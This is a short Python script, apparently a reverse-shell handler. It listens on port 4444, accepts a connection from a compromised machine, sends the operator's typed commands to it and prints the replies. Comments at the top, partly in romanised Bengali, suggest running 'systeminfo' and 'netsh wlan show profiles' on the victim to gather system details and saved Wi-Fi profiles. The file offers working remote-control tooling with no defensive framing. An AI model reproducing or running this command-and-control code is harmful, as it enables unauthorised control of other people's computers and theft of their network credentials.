
####  ei command dwaw....shell a ...> cmd /c systeminfo
####   cmd /c "netsh wlan show profiles"
####  otba shell koiakber enter chapleo aksomy asbe!!!!! 
import socket
import subprocess

HOST = ''        # Listen on all interfaces
PORT = 4444      # Must match the reverse shell's target port

s = socket.socket()
s.bind((HOST, PORT))
s.listen(1)
print(f"Listening on port {PORT}...")
conn, addr = s.accept()
print(f"Connection from {addr}")

try:
    while True:
        cmd = input("CMD> ").strip()
        if cmd.lower() in ['exit', 'quit']:
            conn.send(b'exit')
            conn.close()
            break

        conn.send(cmd.encode())

        data = conn.recv(4096).decode(errors='ignore')
        print(data)
except KeyboardInterrupt:
    print("\n[!] Closing connection.")
    conn.close()
